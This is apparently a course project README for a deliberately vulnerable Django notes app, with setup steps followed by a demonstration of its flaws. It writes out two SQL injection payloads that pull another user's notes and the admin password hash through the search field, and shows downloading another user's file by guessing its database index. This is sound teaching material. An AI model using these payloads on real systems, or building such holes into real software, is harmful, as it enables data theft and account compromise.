CSB PROJECT INSTRUCTIONS

Use the same python path as you used on the rest of the course's exercises in place of [your_venv_path]

The use of sqlite3 as mentioned in step 5 is not necessary but you have to have sqlite3 installed if you want to check the password in the database.

1. git clone https://github.com/thefakejj/csb-project.git
2. ~/[your_venv_path]/python mysite/manage.py makemigrations
3. ~/[your_venv_path]/python mysite/manage.py migrate
4. ~/[your_venv_path]/python mysite/create_or_reset_notes_table.py
5.  ~/[your_venv_path]/python mysite/manage.py createsuperuser (for example username 'admin', password 'admin')

At this point, you'll be able to read the password in the database
sqlite3 mysite/db.sqlite3 

SELECT username, password FROM auth_user;

6. ~/[your_venv_path]/python mysite/manage.py runserver
7. go to http://localhost:8000/admin/ and create some other user (like username 'bob', password 'squarepants')

Make some notes and upload a file
8. logout and log into the other account
9. sql injection with search

DOESNOTEXIST' UNION SELECT note FROM Notes WHERE user_id = 'admin'; --

DOESNOTEXIST' UNION SELECT password FROM auth_user WHERE username = 'admin'; --

10. download admin's file by going to url http://localhost:8000/download/1 (1 is index in database table application_file)

